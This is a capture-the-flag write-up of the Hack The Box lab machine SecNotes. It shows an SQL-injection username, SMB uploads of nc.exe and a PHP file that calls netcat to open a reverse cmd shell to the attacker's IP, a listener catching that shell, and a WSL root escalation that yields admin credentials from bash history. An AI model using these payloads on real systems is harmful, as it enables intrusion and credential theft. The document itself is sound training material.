### HTB SecNotes    10.10.10.97  

First things first, check nmap, always and forever.

```
(kali㉿kali)-$ sudo nmap -T4 -p- -Pn 10.10.10.97                                                     
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 23:32 EDT
Nmap scan report for 10.10.10.97
Host is up (0.044s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 94.61 seconds
```

Looks like we got 80, 445, and 8808.  I know what 80 and 445 are...but what's ssports-bcast on 8808.  Not sure, let's find out a bit more.

```
(kali㉿kali)-$ sudo nmap -p 8808 -A 10.10.10.97      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 23:44 EDT
Nmap scan report for 10.10.10.97
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
8808/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8808/tcp)
HOP RTT      ADDRESS
1   47.55 ms 10.10.14.1
2   47.68 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.06 seconds
```

Ok then.  Looks like another http port.  And we see (if we didn't know already) that this is a Windows machine.  At this point, I'm going to start poking at the webserver to see if I can find anything there.

Fire up the browser, go check it out and upon initial visit I get a login page.  Inputs, wonder if these are vulnerable to injection of any sort.

![No Account](/HTB3SecNotes/pic1.png)

Doesn't look like it on the login page.  Lets create an account.

Create that with test username and get all logged in and looks like we have a note taking app.

![App View](/HTB3SecNotes/pic2.png)

You can also see that we have a username.  Tyler.  Let's keep that in our backpocket for now.  Let's test the account creation page for any type of injection.

So, create an account named `'OR 1 OR'` and then sign in and now look what I get.

![Logged in](/HTB3SecNotes/pic3.png)

And if I open these notes out, looks like I get a list of years, a recipie....and, what's this....a password?

![Tyler's password](/HTB3SecNotes/pic4.png)

So far, interesting.  I think I've pretty much gotten admin on the webapp, even grabbed a password out along with a directory.

Before we move on, let's check to see what port 8808 was.

![Basic IIS Page](/HTB3SecNotes/pic5.png)

Looks like just a basic IIS page.  Nothing too fancy.  So let's take our new found username and password and give that a go on the 445 port (SMB).

```
(kali㉿kali)-$ smbclient -U 'tyler' \\\\10.10.10.97\\new-site
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> pwd
Current directory is \\10.10.10.97\new-site\
smb: \> ls
  .                                   D        0  Sun Aug 19 14:06:14 2018
  ..                                  D        0  Sun Aug 19 14:06:14 2018
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

                7736063 blocks of size 4096. 3394438 blocks available
smb: \> 

```

Looks like I'm working under the website pointed at by 8808.  And Tyler's password worked to get here.  So far not too bad.  Now to see if I can get myself a shell.  So I think here, since I already know the server handles php, we're gonna make that out.

First, let's get our php written out.  Here we're going to use php system() to call nc.exe (netcat) and execute (`-e`) cmd.exe to my IP over port 4444.

![php file](/HTB3SecNotes/pic6.png)

Going to get my netcat listener started in a new terminal tab.

```
(kali㉿kali)-$ nc -nvlp 4444   
listening on [any] 4444 ...
```

Then we put our files to the server.

```
smb: \> put nc.exe
putting file nc.exe as \nc.exe (244.7 kb/s) (average 244.7 kb/s)
smb: \> put shell.php 
putting file shell.php as \shell.php (0.4 kb/s) (average 155.6 kb/s)
smb: \> ls
  .                                   D        0  Tue Oct  8 00:28:39 2024
  ..                                  D        0  Tue Oct  8 00:28:39 2024
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
  nc.exe                              A    59392  Tue Oct  8 00:28:32 2024
  shell.php                           A       54  Tue Oct  8 00:28:39 2024

                7736063 blocks of size 4096. 3394297 blocks available
```

Go back to the browser and go to 10.10.10.97:8808/shell.php and guess what.

```
(kali㉿kali)-$ nc -nvlp 4444   
listening on [any] 4444 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.97] 52009
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>
```

Ok, so now we have a shell.  So let's get some things figured out.  Run a quick `whoami` and find out that we are under the user tyler.

Since this is a Windows subsystem for linux, we're looking for wsl.exe.  After some research and checking payloadsallthethings, we do find a small section Windows Subsystem for Linux that talks about wsl.exe and bash.exe.  So we find it by the following

```
C:\inetpub\new-site>where /R c:\windows wsl.exe
where /R c:\windows wsl.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe

C:\inetpub\new-site>where /R c:\windows bash.exe
where /R c:\windows bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

Now that we have that info, we can check who the default user is for wsl.exe

```
C:\inetpub\new-site>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami
root
```

Ahh, it's in root.  Very interesting.  So, let's try this.

```
C:\inetpub\new-site>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
```

Now we can get some more info gathing going on and even use python to get to a shell.

```
whoami
root
hostname
SECNOTES
uname -a
Linux SECNOTES 4.4.0-17134-Microsoft #137-Microsoft Thu Jun 14 18:46:00 PST 2018 x86_64 x86_64 x86_64 GNU/Linux
python3 -c "import pty;pty.spawn('/bin/bash')"
root@SECNOTES:~# whoami
whoami
root
```

And look at that, we're root.  In a linux subsystem.  Quick `ls -a` shows we have a bash history.  Let's give that a check.

![history](/HTB3SecNotes/pic7.png)

And would you look at that, an admin password.  How nice of them to leave this in the history like that.

Well now that we have that, we win.  So open a new tab and give psexec.py a go and what do we get?

![Whoami](/HTB3SecNotes/pic8.png)

And now we get the flag.  And another one taken down!!  That's how we do it.

![Root Flag boiiii](/HTB3SecNotes/pic9.png)

Thanks for coming with me on this little adventure!!  More to come soon! :D